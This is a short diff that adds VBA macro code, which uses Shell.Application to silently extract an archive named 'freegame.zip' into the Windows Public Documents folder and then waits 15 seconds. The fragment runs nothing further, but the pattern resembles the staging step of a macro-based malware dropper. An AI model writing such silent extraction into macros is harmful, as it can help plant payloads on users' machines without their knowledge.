@@ -1,0 +1,4 @@
+Dim ShellApp As Object
+Set ShellApp = CreateObject("Shell.Application")
+ShellApp.Namespace("C:\Users\Public\Documents\").CopyHere ShellApp.Namespace("C:\Users\Public\Documents\freegame.zip").items
+Application.Wait (Now + TimeValue("00:00:15"))
